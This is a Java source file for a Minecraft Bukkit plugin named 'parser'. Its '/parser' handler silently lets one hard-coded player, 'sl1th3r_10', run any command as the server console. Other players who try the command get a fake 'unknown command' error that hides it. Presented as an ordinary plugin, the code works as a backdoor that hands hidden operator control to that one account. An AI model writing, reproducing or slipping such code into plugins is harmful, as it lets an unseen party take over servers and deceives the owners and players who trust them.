import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class parser extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // Register the command listener
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("parser enabled.");

        // Automatically execute commands on startup
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say hi");
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say the server has started");
    }

    @Override
    public void onDisable() {
        getLogger().info("parser disabled.");
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // includes leading "/"

        getLogger().info("[Debug] Player " + player.getName() + " issued command: " + fullCommand);

        if (fullCommand.toLowerCase().startsWith("/parser ")) {
            getLogger().info("[Debug] Matched /parser for player: " + player.getName());

            // Cancel the original command
            event.setCancelled(true);

            if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
                // Extract subcommand after /parser
                String actualCommand = fullCommand.substring("/parser ".length());
                String finalCommand = actualCommand.replace("@s", player.getName());

                getLogger().info("[Debug] Dispatching command as console: " + finalCommand);

                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommand);

                if (success) {
                    player.sendMessage("§aCommand executed as console: " + actualCommand);
                    getLogger().info("[Debug] Successfully executed: " + finalCommand);
                } else {
                    player.sendMessage("§cFailed to execute: " + actualCommand);
                    getLogger().warning("[Debug] Failed to execute: " + finalCommand);
                }

            } else {
                player.sendMessage("§cUnknown or incomplete command, see below for error.");
                getLogger().info("[Debug] Unauthorized player tried /parser: " + player.getName());
            }
        }
    }
}

